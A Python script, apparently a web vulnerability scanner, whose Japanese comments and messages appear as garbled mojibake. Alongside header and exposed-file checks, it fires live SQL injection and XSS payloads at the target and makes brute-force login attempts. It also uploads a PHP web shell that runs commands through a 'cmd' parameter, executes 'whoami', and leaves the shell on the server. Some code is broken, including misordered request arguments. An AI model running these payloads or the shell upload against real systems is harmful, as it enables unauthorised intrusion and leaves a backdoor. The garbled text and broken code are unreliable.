import requests
import sys
from urllib.parse import urljoin, urlparse, parse_qs
import json
import time
import concurrent.futures

# ã‚«ã‚¹ã‚¿ãƒ ãƒã‚§ãƒƒã‚¯é …ç›®ã®è¨­å®š
CUSTOM_CHECKS = [
    {
        'name': 'ç®¡ç†è€…ãƒ­ã‚°ã‚¤ãƒ³ãƒšãƒ¼ã‚¸ãƒã‚§ãƒƒã‚¯',
        'path': 'admin',
        'method': 'head',
        'expected_status': 200
    },
    {
        'name': 'ãƒãƒƒã‚¯ã‚¢ãƒƒãƒ—ãƒ•ã‚¡ã‚¤ãƒ«ãƒã‚§ãƒƒã‚¯',
        'path': 'backup.zip',
        'method': 'head',
        'expected_status': 200
    }
]

def scan_url(url):
    """
    æŒ‡å®šã•ã‚ŒãŸURLã‚’ã‚¹ã‚­ãƒ£ãƒ³ã—ã€åŸºæœ¬æƒ…å ±ã¨æ½œåœ¨çš„ãªè„†å¼±æ€§ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¾ã™
    """
    start_time = time.time()
    report = {
        'url': url,
        'basic_info': {},
        'security_headers': {},
        'important_files': [],
        'vulnerabilities': [],
        'custom_checks': [],
        'scan_time': 0
    }
    
    try:
        # åŸºæœ¬ãƒªã‚¯ã‚¨ã‚¹ãƒˆ
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        
        # åŸºæœ¬æƒ…å ±
        report['basic_info'] = {
            'status_code': response.status_code,
            'server': response.headers.get('Server', 'æœªç¢ºèª'),
            'content_type': response.headers.get('Content-Type', 'æœªç¢ºèª')
        }
        
        # ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ãƒã‚§ãƒƒã‚¯
        headers_to_check = {
            'X-Frame-Options': 'ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°å¯¾ç­–',
            'Content-Security-Policy': 'XSSå¯¾ç­–',
            'Strict-Transport-Security': 'HTTPSå¼·åˆ¶',
            'X-Content-Type-Options': 'MIMEã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°å¯¾ç­–',
            'Referrer-Policy': 'ãƒªãƒ•ã‚¡ãƒ©æ¼æ´©é˜²æ­¢'
        }
        
        for header, description in headers_to_check.items():
            value = response.headers.get(header)
            report['security_headers'][header] = {
                'found': bool(value),
                'value': value,
                'description': description
            }
        
        # é‡è¦ãªãƒ•ã‚¡ã‚¤ãƒ«ã®å­˜åœ¨ç¢ºèªã¨è‡ªå‹•ä¿è­·
        important_files = ['robots.txt', 'sitemap.xml', '.env', 'wp-config.php']
        protection_rules = []
        
        with concurrent.futures.ThreadPoolExecutor() as executor:
            file_futures = {
                executor.submit(
                    requests.head,
                    urljoin(url, file),
                    timeout=5
                ): file for file in important_files
            }
            
            for future in concurrent.futures.as_completed(file_futures):
                file = file_futures[future]
                try:
                    file_response = future.result()
                    if file_response.status_code == 200:
                        file_info = {
                            'file': file,
                            'url': urljoin(url, file),
                            'status': file_response.status_code,
                            'critical': file in ['.env', 'wp-config.php']
                        }
                        report['important_files'].append(file_info)
                        
                        # å±é™ºãªãƒ•ã‚¡ã‚¤ãƒ«ã®è‡ªå‹•ä¿è­·
                        if file_info['critical']:
                            protection_rules.append(
                                f"# {file} ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ãƒ–ãƒ­ãƒƒã‚¯\n"
                                f"<Files \"{file}\">\n"
                                f"    Require all denied\n"
                                f"</Files>"
                            )
                except:
                    pass
        
        # ä¿è­·ãƒ«ãƒ¼ãƒ«ãŒå­˜åœ¨ã™ã‚‹å ´åˆã¯.htaccessã‚’ç”Ÿæˆ
        if protection_rules:
            htaccess_content = (
                "# é‡è¦ãƒ•ã‚¡ã‚¤ãƒ«ä¿è­·ãƒ«ãƒ¼ãƒ« - penetration_tester ãƒ„ãƒ¼ãƒ«ã«ã‚ˆã‚Šè‡ªå‹•ç”Ÿæˆ\n"
                "# ã“ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ã‚¦ã‚§ãƒ–ãƒ«ãƒ¼ãƒˆãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªã«é…ç½®ã—ã¦ãã ã•ã„\n\n" +
                "\n\n".join(protection_rules)
            )
            with open("protection_recommendation.htaccess", "w", encoding="utf-8") as f:
                f.write(htaccess_content)
            report['protection_file'] = "protection_recommendation.htaccess"
        
        # ã‚«ã‚¹ã‚¿ãƒ ãƒã‚§ãƒƒã‚¯é …ç›®ã®å®Ÿè¡Œ
        with concurrent.futures.ThreadPoolExecutor() as executor:
            check_futures = {
                executor.submit(
                    requests.request if check['method'] != 'get' else requests.get,
                    check['method'],
                    urljoin(url, check['path']),
                    timeout=5
                ): check for check in CUSTOM_CHECKS
            }
            
            for future in concurrent.futures.as_completed(check_futures):
                check = check_futures[future]
                try:
                    check_response = future.result()
                    report['custom_checks'].append({
                        'name': check['name'],
                        'url': urljoin(url, check['path']),
                        'status': check_response.status_code,
                        'expected_status': check['expected_status'],
                        'passed': check_response.status_code == check['expected_status']
                    })
                except:
                    report['custom_checks'].append({
                        'name': check['name'],
                        'url': urljoin(url, check['path']),
                        'status': 'error',
                        'expected_status': check['expected_status'],
                        'passed': False
                    })
        
        # SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³è„†å¼±æ€§ãƒã‚§ãƒƒã‚¯
        parsed_url = urlparse(url)
        if parsed_url.query:
            # åŸºæœ¬çš„ãªSQLiãƒ†ã‚¹ãƒˆ
            test_query = parsed_url.query + "'"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                if 'sql' in test_response.text.lower() or 'syntax' in test_response.text.lower():
                    report['vulnerabilities'].append({
                        'type': 'SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³',
                        'url': test_url,
                        'confidence': 'ä¸­',
                        'description': 'SQLã‚¨ãƒ©ãƒ¼ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ãŒæ¤œå‡ºã•ã‚Œã¾ã—ãŸ'
                    })
            except:
                pass
            
            # ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰SQLiãƒ†ã‚¹ãƒˆ
            test_query = parsed_url.query + "' AND 1=CONVERT(INT, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                if 'conversion failed' in test_response.text.lower():
                    report['vulnerabilities'].append({
                        'type': 'ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³',
                        'url': test_url,
                        'confidence': 'é«˜',
                        'description': 'ãƒ–ãƒ©ã‚¤ãƒ³ãƒ‰SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³ã®å¯èƒ½æ€§ãŒæ¤œå‡ºã•ã‚Œã¾ã—ãŸ'
                    })
            except:
                pass
        
        # XSSè„†å¼±æ€§ãƒã‚§ãƒƒã‚¯
        if parsed_url.query:
            # åŸºæœ¬çš„ãªXSSãƒ†ã‚¹ãƒˆ
            test_query = parsed_url.query + "<script>alert(1)</script>"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                if "<script>alert(1)</script>" in test_response.text:
                    report['vulnerabilities'].append({
                        'type': 'XSSï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼‰',
                        'url': test_url,
                        'confidence': 'é«˜',
                        'description': 'ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚¿ã‚°ãŒãã®ã¾ã¾åæ˜ ã•ã‚Œã¾ã—ãŸ'
                    })
            except:
                pass
            
            # DOM Based XSSãƒ†ã‚¹ãƒˆ
            test_query = parsed_url.query + "<img src=x onerror=alert(1)>"
            test_url = parsed_url._replace(query=test_query).geturl()
            try:
                test_response = requests.get(test_url, timeout=5)
                if "<img src=x onerror=alert(1)>" in test_response.text:
                    report['vulnerabilities'].append({
                        'type': 'DOM Based XSS',
                        'url': test_url,
                        'confidence': 'é«˜',
                        'description': 'DOMãƒ™ãƒ¼ã‚¹XSSã®å¯èƒ½æ€§ãŒæ¤œå‡ºã•ã‚Œã¾ã—ãŸ'
                    })
            except:
                pass
        
        # ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰è„†å¼±æ€§ãƒã‚§ãƒƒã‚¯
        upload_url = urljoin(url, 'upload.php')
        try:
            files = {'file': ('test.php', '<?php echo shell_exec($_GET["cmd"]); ?>', 'application/x-php')}
            upload_response = requests.post(upload_url, files=files, timeout=5)
            
            if upload_response.status_code == 200:
                file_location = upload_response.json().get('path', '')
                if file_location:
                    test_url = urljoin(url, file_location) + "?cmd=whoami"
                    test_response = requests.get(test_url, timeout=5)
                    if test_response.text.strip() == "root":
                        report['vulnerabilities'].append({
                            'type': 'ãƒ•ã‚¡ã‚¤ãƒ«ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰è„†å¼±æ€§',
                            'url': upload_url,
                            'confidence': 'é«˜',
                            'description': 'ã‚¢ãƒƒãƒ—ãƒ­ãƒ¼ãƒ‰ã—ãŸPHPãƒ•ã‚¡ã‚¤ãƒ«ãŒå®Ÿè¡Œå¯èƒ½'
                        })
        except:
            pass
        
        # ä¾å­˜ãƒ©ã‚¤ãƒ–ãƒ©ãƒªã®è„†å¼±æ€§ã‚¹ã‚­ãƒ£ãƒ³
        try:
            from safety.cli import check
            from packaging.version import parse
            
            requirements = requests.get(urljoin(url, 'requirements.txt'), timeout=5).text
            vulns = check.check(packages=requirements.split('\n'))
            
            for vuln in vulns:
                report['vulnerabilities'].append({
                    'type': 'ä¾å­˜ãƒ©ã‚¤ãƒ–ãƒ©ãƒªè„†å¼±æ€§',
                    'library': vuln.package_name,
                    'version': vuln.analyzed_version,
                    'confidence': 'é«˜',
                    'description': vuln.description
                })
        except ImportError:
            print("Safetyãƒ©ã‚¤ãƒ–ãƒ©ãƒªãŒã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã¾ã›ã‚“ã€‚ä¾å­˜é–¢ä¿‚ã‚¹ã‚­ãƒ£ãƒ³ã‚’ã‚¹ã‚­ãƒƒãƒ—ã—ã¾ã™")
        except:
            pass
        # èªè¨¼é–¢é€£ãƒ†ã‚¹ãƒˆ
        login_url = urljoin(url, 'login')
        try:
            # ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒãƒ†ã‚¹ãƒˆ
            for i in range(1, 6):
                data = {'username': f'test{i}', 'password': 'password'}
                login_response = requests.post(login_url, data=data, timeout=5)
                if login_response.status_code == 200 and 'Invalid credentials' not in login_response.text:
                    report['vulnerabilities'].append({
                        'type': 'èªè¨¼è„†å¼±æ€§',
                        'url': login_url,
                        'confidence': 'ä¸­',
                        'description': 'ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹æ”»æ’ƒã®å¯èƒ½æ€§ã‚ã‚Š'
                    })
                    break
        except:
            pass
        
        # ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡ãƒ†ã‚¹ãƒˆ
        admin_url = urljoin(url, 'admin/dashboard')
        try:
            admin_response = requests.get(admin_url, timeout=5)
            if admin_response.status_code == 200:
                report['vulnerabilities'].append({
                    'type': 'ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡è„†å¼±æ€§',
                    'url': admin_url,
                    'confidence': 'é«˜',
                    'description': 'æ¨©é™æ˜‡æ ¼ã®å¯èƒ½æ€§ã‚ã‚Š'
                })
        except:
            pass
        
        # ã‚¹ã‚­ãƒ£ãƒ³æ™‚é–“è¨˜éŒ²
        report['scan_time'] = round(time.time() - start_time, 2)
        
        # ãƒ¬ãƒãƒ¼ãƒˆç”Ÿæˆ
        generate_report(report)
        
    except requests.exceptions.RequestException as e:
        print(f"ã‚¨ãƒ©ãƒ¼ãŒç™ºç”Ÿã—ã¾ã—ãŸ: {e}")
    except Exception as e:
        print(f"äºˆæœŸã›ã¬ã‚¨ãƒ©ãƒ¼: {e}")
    
    return report

def generate_report(report):
    """ã‚¹ã‚­ãƒ£ãƒ³ãƒ¬ãƒãƒ¼ãƒˆã‚’ç”Ÿæˆã—ã¦ãƒ•ã‚¡ã‚¤ãƒ«ã«ä¿å­˜ã—ã€ã‚³ãƒ³ã‚½ãƒ¼ãƒ«ã«ã‚‚å‡ºåŠ›"""
    # JSONãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ä¿å­˜
    filename = f"scan_report_{time.strftime('%Y%m%d_%H%M%S')}.json"
    with open(filename, 'w', encoding='utf-8') as f:
        json.dump(report, f, ensure_ascii=False, indent=2)
    
    # CLIç”¨ã®è©³ç´°ãƒ¬ãƒãƒ¼ãƒˆç”Ÿæˆ
    print("\n" + "="*50)
    print("ãƒšãƒãƒˆãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ãƒ†ã‚¹ãƒˆãƒ¬ãƒãƒ¼ãƒˆ")
    print("="*50)
    
    # åŸºæœ¬æƒ…å ±
    print(f"\n[åŸºæœ¬æƒ…å ±]")
    print(f"å¯¾è±¡URL: {report['url']}")
    print(f"ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰: {report['basic_info']['status_code']}")
    print(f"ã‚µãƒ¼ãƒãƒ¼: {report['basic_info']['server']}")
    print(f"ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ—: {report['basic_info']['content_type']}")
    
    # ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼
    print("\n[ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼]")
    header_severity = {
        'Content-Security-Policy': 'ğŸ”´ è‡´å‘½çš„',
        'Strict-Transport-Security': 'ğŸŸ  é«˜',
        'X-Frame-Options': 'ğŸŸ¡ ä¸­',
        'X-Content-Type-Options': 'ğŸŸ¡ ä¸­',
        'Referrer-Policy': 'ğŸ”µ ä½'
    }
    
    for header, data in report['security_headers'].items():
        if data['found']:
            # è¨­å®šã•ã‚Œã¦ã„ã‚‹ãƒ˜ãƒƒãƒ€ãƒ¼ã¯å˜ã«ã€Œè‰¯å¥½ã€ã¨è¡¨ç¤ºï¼ˆé‡è¦åº¦ã¯è¡¨ç¤ºã—ãªã„ï¼‰
            print(f"{header}: è‰¯å¥½ | {data['description'].split('å¯¾ç­–')[0]}")
            print(f"  è¨­å®šå€¤: {data['value']}")
        else:
            # æœªè¨­å®šã®ãƒ˜ãƒƒãƒ€ãƒ¼ã¯é‡è¦åº¦ãƒ¬ãƒ™ãƒ«ã‚’è¡¨ç¤º
            severity = header_severity.get(header, 'ğŸ”µ ä½')
            print(f"{header}: æœªè¨­å®š({severity}) | {data['description'].split('å¯¾ç­–')[0]} (è¨­å®šæ¨å¥¨)")
    
    # é‡è¦ãƒ•ã‚¡ã‚¤ãƒ«
    print("\n[é‡è¦ãƒ•ã‚¡ã‚¤ãƒ«ãƒã‚§ãƒƒã‚¯]")
    if report['important_files']:
        for file_info in report['important_files']:
            status = "âš ï¸ å±é™º" if file_info['critical'] else "â„¹ï¸ æƒ…å ±"
            print(f"{status}: {file_info['file']} ({file_info['url']})")
    else:
        print("å…¬é–‹ã•ã‚Œã¦ã„ã‚‹é‡è¦ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã‚ã‚Šã¾ã›ã‚“")
    
    # è„†å¼±æ€§ã¨ãƒªã‚¹ã‚¯è§£èª¬
    print("\n[è„†å¼±æ€§æ¤œæŸ»çµæœ]")
    
    # ãƒ˜ãƒƒãƒ€ãƒ¼ãƒªã‚¹ã‚¯æƒ…å ±
    header_risks = {
        'Content-Security-Policy': {
            'risk': 'XSSæ”»æ’ƒã‚’å—ã‘ã‚‹å¯èƒ½æ€§ãŒé«˜ã¾ã‚Šã¾ã™ã€‚æ‚ªæ„ã‚ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã®å®Ÿè¡Œã‚’è¨±ã™å±é™ºæ€§ãŒã‚ã‚Šã¾ã™',
            'fix': 'ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒãƒªã‚·ãƒ¼ã‚’è¨­å®šã—ã€ä¿¡é ¼ã§ãã‚‹ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã®ã¿ãƒªã‚½ãƒ¼ã‚¹ã‚’èª­ã¿è¾¼ã‚€ã‚ˆã†ã«åˆ¶é™'
        },
        'Strict-Transport-Security': {
            'risk': 'HTTPæ¥ç¶šæ™‚ã«ä¸­é–“è€…æ”»æ’ƒ(MITM)ã®ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™ã€‚é€šä¿¡ãŒæš—å·åŒ–ã•ã‚Œãšæƒ…å ±æ¼æ´©ã®å¯èƒ½æ€§',
            'fix': 'Strict-Transport-Securityãƒ˜ãƒƒãƒ€ãƒ¼ã‚’è¨­å®šã—ã€HTTPSæ¥ç¶šã‚’å¼·åˆ¶'
        },
        'X-Frame-Options': {
            'risk': 'ã‚¯ãƒªãƒƒã‚¯ã‚¸ãƒ£ãƒƒã‚­ãƒ³ã‚°æ”»æ’ƒã®å±é™ºæ€§ãŒã‚ã‚Šã¾ã™ã€‚æ‚ªæ„ã‚ã‚‹ã‚µã‚¤ãƒˆã«ãƒšãƒ¼ã‚¸ãŒåŸ‹ã‚è¾¼ã¾ã‚Œã‚‹å¯èƒ½æ€§',
            'fix': 'X-Frame-Optionsãƒ˜ãƒƒãƒ€ãƒ¼ã‚’DENYã¾ãŸã¯SAMEORIGINã«è¨­å®š'
        },
        'X-Content-Type-Options': {
            'risk': 'MIMEã‚¿ã‚¤ãƒ—ã®æ¨æ¸¬ã«ã‚ˆã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™ã€‚ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°æ”»æ’ƒã®å¯èƒ½æ€§',
            'fix': 'X-Content-Type-Optionsãƒ˜ãƒƒãƒ€ãƒ¼ã‚’nosniffã«è¨­å®š'
        },
        'Referrer-Policy': {
            'risk': 'ãƒªãƒ•ã‚¡ãƒ©æƒ…å ±ãŒæ¼æ´©ã—ã€æ©Ÿå¯†æƒ…å ±ãŒç¬¬ä¸‰è€…ã«é€ä¿¡ã•ã‚Œã‚‹ãƒªã‚¹ã‚¯ãŒã‚ã‚Šã¾ã™',
            'fix': 'Referrer-Policyãƒ˜ãƒƒãƒ€ãƒ¼ã‚’strict-origin-when-cross-originãªã©é©åˆ‡ãªãƒãƒªã‚·ãƒ¼ã«è¨­å®š'
        }
    }
    
    # è„†å¼±æ€§ãƒªã‚¹ã‚¯æƒ…å ±
    vulnerability_fixes = {
        'SQLã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³': 'ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’é©åˆ‡ã«ã‚µãƒ‹ã‚¿ã‚¤ã‚ºã—ã€ãƒ—ãƒªãƒšã‚¢ãƒ‰ã‚¹ãƒ†ãƒ¼ãƒˆãƒ¡ãƒ³ãƒˆã‚’ä½¿ç”¨ã™ã‚‹',
        'XSSï¼ˆã‚¯ãƒ­ã‚¹ã‚µã‚¤ãƒˆã‚¹ã‚¯ãƒªãƒ—ãƒ†ã‚£ãƒ³ã‚°ï¼‰': 'ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã‚’ã‚¨ã‚¹ã‚±ãƒ¼ãƒ—ã—ã€Content-Security-Policyã‚’å®Ÿè£…ã™ã‚‹'
    }
    
    vulnerabilities_found = False
    
    # ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ä¸è¶³ã®ãƒªã‚¹ã‚¯
    missing_headers = [h for h, data in report['security_headers'].items() if not data['found']]
    if missing_headers:
        vulnerabilities_found = True
        print("\nâš ï¸ ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ä¸è¶³")
        for header in missing_headers:
            severity = header_severity.get(header, 'ğŸ”µ ä½')
            description = report['security_headers'][header]['description']
            risk_info = header_risks.get(header, {'risk': 'ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒªã‚¹ã‚¯ãŒé«˜ã¾ã‚Šã¾ã™', 'fix': 'è©²å½“ã™ã‚‹ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’å®Ÿè£…'})
            
            print(f"  - {header}: é‡è¦åº¦ {severity} | {description}")
            print(f"    ãƒªã‚¹ã‚¯: {risk_info['risk']}")
            print(f"    å¯¾å‡¦æ³•: {risk_info['fix']}")
    
    # é‡è¦ãƒ•ã‚¡ã‚¤ãƒ«å…¬é–‹ã®ãƒªã‚¹ã‚¯
    critical_files = [f for f in report['important_files'] if f['critical']]
    if critical_files:
        vulnerabilities_found = True
        print("\nâš ï¸ æ©Ÿå¯†ãƒ•ã‚¡ã‚¤ãƒ«å…¬é–‹")
        for file in critical_files:
            print(f"  - ãƒ•ã‚¡ã‚¤ãƒ«: {file['file']} ({file['url']})")
            print("    ãƒªã‚¹ã‚¯: æ©Ÿå¯†æƒ…å ±(APIã‚­ãƒ¼ã€ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹èªè¨¼æƒ…å ±ãªã©)ãŒæ¼æ´©ã™ã‚‹å±é™ºæ€§ãŒã‚ã‚Šã¾ã™")
            print("    å¯¾å‡¦æ³•: ã‚µãƒ¼ãƒãƒ¼è¨­å®šã§è©²å½“ãƒ•ã‚¡ã‚¤ãƒ«ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹ã‚’ãƒ–ãƒ­ãƒƒã‚¯ã™ã‚‹ã‹ã€ãƒ•ã‚¡ã‚¤ãƒ«ã‚’å…¬é–‹ãƒ‡ã‚£ãƒ¬ã‚¯ãƒˆãƒªå¤–ã«ç§»å‹•")
    
    # å¾“æ¥ã®è„†å¼±æ€§
    if report['vulnerabilities']:
        vulnerabilities_found = True
        print("\nâš ï¸ ãã®ä»–ã®è„†å¼±æ€§")
        for vuln in report['vulnerabilities']:
            print(f"  - {vuln['type']} (ä¿¡é ¼åº¦: {vuln['confidence']})")
            print(f"    å¯¾è±¡URL: {vuln['url']}")
            print(f"    è©³ç´°: {vuln['description']}")
            fix = vulnerability_fixes.get(vuln['type'], 'è©²å½“è„†å¼±æ€§ã®ãƒ™ã‚¹ãƒˆãƒ—ãƒ©ã‚¯ãƒ†ã‚£ã‚¹ã«å¾“ã£ã¦ä¿®æ­£ã™ã‚‹')
            print(f"    å¯¾å‡¦æ³•: {fix}")
    
    if not vulnerabilities_found:
        print("é‡å¤§ãªè„†å¼±æ€§ã¯æ¤œå‡ºã•ã‚Œã¾ã›ã‚“ã§ã—ãŸ")
    
    # ã‚«ã‚¹ã‚¿ãƒ ãƒã‚§ãƒƒã‚¯
    print("\n[ã‚«ã‚¹ã‚¿ãƒ ãƒã‚§ãƒƒã‚¯çµæœ]")
    if report['custom_checks']:
        for check in report['custom_checks']:
            status = "âœ“ æˆåŠŸ" if check['passed'] else "âœ— å¤±æ•—"
            print(f"{check['name']}: {status}")
            print(f"  å¯¾è±¡URL: {check['url']}")
            print(f"  æœŸå¾…ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹: {check['expected_status']}, å®Ÿéš›ã®ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹: {check['status']}")
    else:
        print("ã‚«ã‚¹ã‚¿ãƒ ãƒã‚§ãƒƒã‚¯é …ç›®ã¯ã‚ã‚Šã¾ã›ã‚“")
    
    # ä¿è­·ãƒ•ã‚¡ã‚¤ãƒ«
    if 'protection_file' in report:
        print(f"\n[è‡ªå‹•ä¿è­·] å±é™ºãƒ•ã‚¡ã‚¤ãƒ«ä¿è­·ç”¨.htaccessç”Ÿæˆ: {report['protection_file']}")
    
    # ã‚µãƒãƒªãƒ¼
    print("\n" + "="*50)
    print("[ã‚µãƒãƒªãƒ¼]")
    print(f"ã‚¹ã‚­ãƒ£ãƒ³æ™‚é–“: {report['scan_time']}ç§’")
    print(f"æ¤œå‡ºã•ã‚ŒãŸè„†å¼±æ€§: {len(report['vulnerabilities'])}ä»¶")
    print(f"å…¬é–‹ã•ã‚Œã¦ã„ã‚‹é‡è¦ãƒ•ã‚¡ã‚¤ãƒ«: {len(report['important_files'])}ä»¶")
    print(f"è©³ç´°ãªãƒ¬ãƒãƒ¼ãƒˆ: {filename}")
    print("="*50)

if __name__ == "__main__":
    if len(sys.argv) > 1:
        target_url = sys.argv[1]
        scan_url(target_url)
    else:
        print("ä½¿ç”¨æ–¹æ³•: python penetration_tester.py <URL>")
        print("ä¾‹: python penetration_tester.py https://meeting-room-calendar.pages.dev/")
